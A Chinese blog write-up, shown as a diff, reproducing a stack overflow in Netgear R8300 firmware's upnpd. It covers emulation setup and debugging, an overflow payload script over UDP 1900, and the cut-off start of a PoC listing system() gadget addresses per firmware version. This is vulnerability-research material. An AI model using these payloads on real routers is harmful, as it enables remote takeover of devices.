@@ -1,0 +1,769 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>Netgear R8300 PSV-2020-0211栈溢出复现 | p1Kk&#39;s World!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="p1Kk">
+    
+
+    
+    <meta name="description" content="复现一个Netgear R8300设备的栈溢出漏洞，要求是编写先探测目标版本号，再发送payload的POC  ARM前言arm32指令   指令 描述 指令 描述    MOV 移动数据 EOR 按位异或   MVN 移动并取反 LDR 加载   ADD 加 STR 存储   SUB 减 LDM 加载多个   MUL 乘 STM 存储多个   LSL 逻辑左移 PUSH 入栈   LSR 逻辑">
+<meta name="keywords" content="iot,漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Netgear R8300 PSV-2020-0211栈溢出复现">
+<meta property="og:url" content="p1Kk.github.io/2020/12/20/路由器/Netgear R8300/index.html">
+<meta property="og:site_name" content="p1Kk&#39;s World!">
+<meta property="og:description" content="复现一个Netgear R8300设备的栈溢出漏洞，要求是编写先探测目标版本号，再发送payload的POC  ARM前言arm32指令   指令 描述 指令 描述    MOV 移动数据 EOR 按位异或   MVN 移动并取反 LDR 加载   ADD 加 STR 存储   SUB 减 LDM 加载多个   MUL 乘 STM 存储多个   LSL 逻辑左移 PUSH 入栈   LSR 逻辑">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/sub_1D020.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/sub_25E04.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/8300libcso6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/errordlsym.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/runsuccess.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/failgdb.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/successgdb.png">
+<meta property="og:updated_time" content="2021-02-04T13:25:07.847Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Netgear R8300 PSV-2020-0211栈溢出复现">
+<meta name="twitter:description" content="复现一个Netgear R8300设备的栈溢出漏洞，要求是编写先探测目标版本号，再发送payload的POC  ARM前言arm32指令   指令 描述 指令 描述    MOV 移动数据 EOR 按位异或   MVN 移动并取反 LDR 加载   ADD 加 STR 存储   SUB 减 LDM 加载多个   MUL 乘 STM 存储多个   LSL 逻辑左移 PUSH 入栈   LSR 逻辑">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/sub_1D020.png">
+
+    
+    <link rel="alternative" href="atom.xml" title="p1Kk&#39;s World!" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/site.jpg">
+    
+    
+    <link rel="apple-touch-icon" href="/img/head.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/head.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo2.jpg" alt="p1Kk&#39;s World!" title="p1Kk&#39;s World!"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="p1Kk&#39;s World!">p1Kk&#39;s World!</a></h1>
+				<h2 class="blog-motto">艺无止境，功不唐捐。</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:p1Kk.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	
+	  <article itemprop="articleBody"> 
+		  <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2020/12/20/路由器/Netgear R8300/" title="Netgear R8300 PSV-2020-0211栈溢出复现" itemprop="url">Netgear R8300 PSV-2020-0211栈溢出复现</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="p1Kk" target="_blank" itemprop="author">p1Kk</a>
+		
+  <p class="article-time">
+    <time datetime="2020-12-19T16:00:00.000Z" itemprop="datePublished"> Published 2020-12-20</time>
+    
+  </p>
+</header>
+	  <div class="article-content">
+		  
+		  <div id="toc" class="toc-article">
+			  <strong class="toc-title">Contents</strong>
+		  
+			  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ARM前言"><span class="toc-number">1.</span> <span class="toc-text">ARM前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#arm32指令"><span class="toc-number">1.1.</span> <span class="toc-text">arm32指令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32位"><span class="toc-number">1.2.</span> <span class="toc-text">32位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64位"><span class="toc-number">1.3.</span> <span class="toc-text">(64位)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#叶函数-非页函数"><span class="toc-number">1.4.</span> <span class="toc-text">叶函数 非页函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞点"><span class="toc-number">2.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#环境搭建"><span class="toc-number">3.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#user-mod"><span class="toc-number">3.1.</span> <span class="toc-text">user mod</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#修复NVRAM错误"><span class="toc-number">3.1.1.</span> <span class="toc-text">修复NVRAM错误</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sys-mod"><span class="toc-number">3.2.</span> <span class="toc-text">sys mod</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#探测目标版本"><span class="toc-number">3.3.</span> <span class="toc-text">探测目标版本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#poc"><span class="toc-number">4.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#其他"><span class="toc-number">5.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#获取ARM架构的libc-so-6文件方法"><span class="toc-number">5.1.</span> <span class="toc-text">获取ARM架构的libc.so.6文件方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#附录"><span class="toc-number">6.</span> <span class="toc-text">附录</span></a></li></ol>
+		  
+		  </div>
+		  
+		  <blockquote>
+<p>复现一个Netgear R8300设备的栈溢出漏洞，要求是编写先探测目标版本号，再发送payload的POC</p>
+</blockquote>
+<h1 id="ARM前言"><a href="#ARM前言" class="headerlink" title="ARM前言"></a>ARM前言</h1><h2 id="arm32指令"><a href="#arm32指令" class="headerlink" title="arm32指令"></a>arm32指令</h2><table>
+<thead>
+<tr>
+<th><strong>指令</strong></th>
+<th><strong>描述</strong></th>
+<th><strong>指令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MOV</td>
+<td>移动数据</td>
+<td>EOR</td>
+<td>按位异或</td>
+</tr>
+<tr>
+<td>MVN</td>
+<td>移动并取反</td>
+<td>LDR</td>
+<td>加载</td>
+</tr>
+<tr>
+<td>ADD</td>
+<td>加</td>
+<td>STR</td>
+<td>存储</td>
+</tr>
+<tr>
+<td>SUB</td>
+<td>减</td>
+<td>LDM</td>
+<td>加载多个</td>
+</tr>
+<tr>
+<td>MUL</td>
+<td>乘</td>
+<td>STM</td>
+<td>存储多个</td>
+</tr>
+<tr>
+<td>LSL</td>
+<td>逻辑左移</td>
+<td>PUSH</td>
+<td>入栈</td>
+</tr>
+<tr>
+<td>LSR</td>
+<td>逻辑右移</td>
+<td>POP</td>
+<td>出栈</td>
+</tr>
+<tr>
+<td>ASR</td>
+<td>算术右移</td>
+<td>B</td>
+<td>跳转</td>
+</tr>
+<tr>
+<td>ROR</td>
+<td>右旋</td>
+<td>BL</td>
+<td>Link跳转</td>
+</tr>
+<tr>
+<td>CMP</td>
+<td>比较</td>
+<td>BX</td>
+<td>分支跳转</td>
+</tr>
+<tr>
+<td>AND</td>
+<td>按位与</td>
+<td>BLX</td>
+<td>使用Link分支跳转</td>
+</tr>
+<tr>
+<td>ORR</td>
+<td>按位或</td>
+<td>SWI/SVC</td>
+<td>系统调用</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">ARM架构 寄存器名</th>
+<th align="center">寄存器描述</th>
+<th align="center">Intel架构 寄存器名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">R0</td>
+<td align="center">通用寄存器</td>
+<td align="center">EAX</td>
+</tr>
+<tr>
+<td align="center">R1~R5</td>
+<td align="center">通用寄存器</td>
+<td align="center">EBX、ECX、EDX、EDI、ESI</td>
+</tr>
+<tr>
+<td align="center">R6~R10</td>
+<td align="center">通用寄存器</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">R11(FP)</td>
+<td align="center">栈帧指针</td>
+<td align="center">EBP</td>
+</tr>
+<tr>
+<td align="center">R12(IP)</td>
+<td align="center">内部程序调用</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">R13(SP)</td>
+<td align="center">堆栈指针</td>
+<td align="center">ESP</td>
+</tr>
+<tr>
+<td align="center">R14(LP)</td>
+<td align="center">链接寄存器</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">R15(PC)</td>
+<td align="center">程序计数器</td>
+<td align="center">EIP</td>
+</tr>
+<tr>
+<td align="center">CPSR</td>
+<td align="center">程序状态寄存器</td>
+<td align="center">EFLAGS</td>
+</tr>
+</tbody></table>
+<h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><ol>
+<li><p>参数传递</p>
+<p>前4个参数通过R0 ~ R3传递，第4个参数需要通过sp访问，第5个参数需要sp+4访问，第n个参数需要通过sp + 4*(n-4)访问；当参数个数多于4个时，将多余的参数通过数据栈进行传递，入栈顺序与参数顺序正好相反，子程序返回前无需恢复R0~R3的值</p>
+</li>
+<li><p>在子程序中，使用R4~R11保存局部变量，若使用需要入栈保存，子程序返回前需要恢复这些寄存器；R12是临时寄存器，使用不需要保存</p>
+</li>
+<li><p>子程序返回32位的整数，使用R0返回；返回64位整数时，使用R0返回低位，R1返回高位</p>
+</li>
+</ol>
+<h2 id="64位"><a href="#64位" class="headerlink" title="(64位)"></a>(64位)</h2><ol>
+<li><p>参数传递</p>
+<p>前8个参数是通过x0~x7传递，第8个参数需要通过sp访问，第9个参数需要通过sp + 8 访问，第n个参数需要通过sp + 8*(n-8)访问。</p>
+</li>
+</ol>
+<h2 id="叶函数-非页函数"><a href="#叶函数-非页函数" class="headerlink" title="叶函数 非页函数"></a>叶函数 非页函数</h2><p>叶函数是指本身不会调用其他函数。非叶函数是指除了它自己的逻辑外，还会调用到其他的函数。</p>
+<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/sub_1D020.png" alt="sub_1D020"><br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/sub_25E04.png" alt="sub_25E04"></p>
+<p>0x634-0x58=0x5dc即可溢出v40，0x634-0x34覆盖到v51指针</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>固件下载地址：<a href="https://www.netgear.com/support/product/R8300.aspx#Firmware%20Version%201.0.2.130" target="_blank" rel="noopener">https://www.netgear.com/support/product/R8300.aspx#Firmware%20Version%201.0.2.130</a></p>
+<ul>
+<li><p>qemu-arm：<a href="https://people.debian.org/~aurel32/qemu/armhf/" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/armhf/</a></p>
+<p>（系统态）<a href="https://www.jianshu.com/p/cd7d9a753433" target="_blank" rel="noopener">https://www.jianshu.com/p/cd7d9a753433</a></p>
+</li>
+<li><p>安装arm-linux-gcc</p>
+</li>
+<li><p>安装 <a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cd ./firmadyne/sources/libnvram</span><br><span class="line">$ make clean &amp;&amp; CC=/opt/cross/arm-linux-musleabi/bin/arm-linux-musleabi-gcc make &amp;&amp; mv libnvram.so ../../binaries/libnvram.so.armel</span><br><span class="line">$ cp libnvram.so 【固件目录】/firmadyne/libnvram.so.armel</span><br><span class="line">在固件目录下</span><br><span class="line">$ mkdir -p /firmadyne/libnvram/</span><br><span class="line">$ mkdir -p /firmadyne/libnvram.override/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><del>busybox</del></p>
+</li>
+</ul>
+<h2 id="user-mod"><a href="#user-mod" class="headerlink" title="user mod"></a>user mod</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp $(which qemu-arm-static) .</span><br><span class="line">$ sudo chroot . ./qemu-arm-static --strace ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure>
+
+<p>看到日志     <code>31181 open(&quot;/var/run/upnpd.pid&quot;,O_RDWR|O_CREAT|O_TRUNC,0666) = -1 errno=2 (No such file or directory)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ll ./</span><br><span class="line">total 5972</span><br><span class="line">......</span><br><span class="line">lrwxrwxrwx  1 kk kk       7 Dec 12  2018 var -&gt; tmp/var/</span><br><span class="line">drwxr-xr-x  8 kk kk   28672 Dec 12  2018 www/</span><br></pre></td></tr></table></figure>
+
+<p>所以我们需要创建<code>./tmp/var/run</code>目录，或通过<a href="https://www.cnblogs.com/from-zero/p/12957978.html" target="_blank" rel="noopener">使用-L参数</a>解决</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir -p ./tmp/var/run</span><br></pre></td></tr></table></figure>
+
+<p>再次运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chroot . ./qemu-arm-static ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure>
+
+<p>大量报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">open: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<p>关于<code>LD_PRELOAD</code>—<a href="https://payloads.online/archivers/2020-01-01/1#" target="_blank" rel="noopener">https://payloads.online/archivers/2020-01-01/1#</a></p>
+<h3 id="修复NVRAM错误"><a href="#修复NVRAM错误" class="headerlink" title="修复NVRAM错误"></a>修复NVRAM错误</h3><ul>
+<li>法一</li>
+</ul>
+<p><a href="https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c" target="_blank" rel="noopener">https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ arm-linux-gcc -Wall -fPIC -shared nvram.c -o nvram.so</span><br><span class="line">$ sudo chroot ./ ./qemu-arm-static -E LD_PRELOAD=nvram.so ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure>
+
+<p>报错：</p>
+<p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/8300libcso6.png" alt></p>
+<p>解决方法：在lib目录下有libc.so.0，创建一个软链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ln -s libc.so.0 libc.so.6</span><br></pre></td></tr></table></figure>
+
+<p>再次运行提示</p>
+<p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/errordlsym.png" alt></p>
+<p>查找<code>dlsym</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo grep -r &quot;dlsym&quot; .</span><br><span class="line">$ readelf -a ./lib/libdl.so.0 | grep dlsym</span><br><span class="line">    26: 000010f0   296 FUNC    GLOBAL DEFAULT    7 dlsym</span><br></pre></td></tr></table></figure>
+
+<p>再次运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chroot ./ ./qemu-arm-static -E LD_PRELOAD=&quot;nvram.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure>
+
+<p>根据报错创建文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ touch ./tmp/nvram.ini</span><br></pre></td></tr></table></figure>
+
+<p>然后继续修改nvram配置 在<code>./tmp/nvram.ini</code>中添加配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=192.168.65.1</span><br><span class="line">hwrev=MP1T99</span><br><span class="line">hwver=R8500</span><br><span class="line">friendly_name=R8300</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>法二</li>
+</ul>
+<blockquote>
+<p><a href="https://github.com/zcutlip/nvram-faker" target="_blank" rel="noopener">https://github.com/zcutlip/nvram-faker</a></p>
+<p><a href="https://github.com/firmadyne/libnvram⭐" target="_blank" rel="noopener">https://github.com/firmadyne/libnvram⭐</a></p>
+</blockquote>
+<p>编译运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 我将libnvram的makefile文件中的CC设置为 arm-linux-gcc</span><br><span class="line">$ ./Makefile </span><br><span class="line">$ make</span><br><span class="line">$ cp libnvram.so ~/iot/_R8300-V1.0.2.130_1.0.99.chk.extracted/squashfs-root/firmadyne/libnvram.so</span><br><span class="line">// 在squashfs-root目录下</span><br><span class="line">$ mkdir -p /firmadyne/libnvram/ </span><br><span class="line">$ mkdir -p /firmadyne/libnvram.override/</span><br></pre></td></tr></table></figure>
+
+<p>再次运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chroot . ./qemu-arm-static -E LD_PRELOAD=./firmadyne/libnvram.so ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure>
+
+<p>根据缺少的配置 进行补全，见附录<code>1_config.h</code></p>
+<p>输出的信息会发现，IP总被劫持为0000，将<code>/usr/lib/libnvram.so</code> 替换成我们编译的libnvram.so即可…也不需要ld_preload附加调试了。</p>
+<blockquote>
+<p><a href="http://mrbelieve.tech/2020/10/19/Netgear%20Nighthawk%20R8300%20upnpd%20PreAuth%20RCE%20%E5%A4%8D%E7%8E%B0%E8%BE%85%E5%8A%A9/#qemu-user-mode%E6%A8%A1%E6%8B%9F_" target="_blank" rel="noopener">Netgear Nighthawk R8300 upnpd PreAuth RCE 复现辅助</a></p>
+<p><a href="https://www.anquanke.com/post/id/215428" target="_blank" rel="noopener">https://www.anquanke.com/post/id/215428</a></p>
+</blockquote>
+<h2 id="sys-mod"><a href="#sys-mod" class="headerlink" title="sys mod"></a>sys mod</h2><p>同上法一 运行成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># LD_PRELOAD=&apos;./nvram.so /lib/libdl.so.0&apos; /usr/sbin/upnpd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/runsuccess.png" alt></p>
+<p>开始远程调试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ./gdbserver --attach 192.168.65.2:1234 $(ps|grep upnpd|grep -v grep|awk &apos;&#123;print $1&#125;&apos;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ gdb-multiarch</span><br><span class="line">pwndbg&gt; set architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; target remote 192.168.65.2:1234</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## exp.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">p32 = <span class="keyword">lambda</span> x: struct.pack(<span class="string">"&lt;L"</span>, x)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload = (</span><br><span class="line">    <span class="number">0x604</span> * <span class="string">b'a'</span> + <span class="comment"># 0x7eb1d5ec</span></span><br><span class="line">	p32(<span class="number">0x7eb1d5ec</span>) +  <span class="comment"># v51</span></span><br><span class="line">    (<span class="number">0x634</span> - <span class="number">0x604</span> - <span class="number">8</span>) * <span class="string">b'a'</span> +</span><br><span class="line">    p32(<span class="number">0x43434343</span>)  <span class="comment"># PC</span></span><br><span class="line">)</span><br><span class="line">s.connect((<span class="string">'192.168.65.2'</span>, <span class="number">1900</span>))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<p>第一次直接运行python exp.py发现</p>
+<p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/failgdb.png" alt></p>
+<p>再次调试运行，运行出现upnp_turn_on=1后再执行脚本出现错误</p>
+<p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/successgdb.png" alt></p>
+<h2 id="探测目标版本"><a href="#探测目标版本" class="headerlink" title="探测目标版本"></a>探测目标版本</h2><p><a href="https://github.com/grimm-co/NotQuite0DayFriday" target="_blank" rel="noopener">https://github.com/grimm-co/NotQuite0DayFriday</a>  </p>
+<h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">import SimpleHTTPServer</span><br><span class="line">import SocketServer</span><br><span class="line">import argparse</span><br><span class="line">import collections</span><br><span class="line">import os</span><br><span class="line">import shutil</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">address_info = &#123;</span><br><span class="line">	&quot;R8300&quot; : &#123;</span><br><span class="line">		# 0) gadget: calls system($sp)</span><br><span class="line">		&quot;1.0.2.130&quot; : 0x35B18,</span><br><span class="line">		&quot;1.0.2.128&quot; : 0x35B18,</span><br><span class="line">		&quot;1.0.2.122&quot; : 0x355fc,</span><br><span class="line">		&quot;1.0.2.116&quot; : 0x35258,</span><br><span class="line">		&quot;1.0.2.106&quot; : 0x34f40,</span><br><span class="line">		&quot;1.0.2.100&quot; : 0x34d38,</span><br><span class="line">		&quot;1.0.2.94&quot;  : 0x34d8c,</span><br><span class="line">		&quot;1.0.2.86&quot;  : 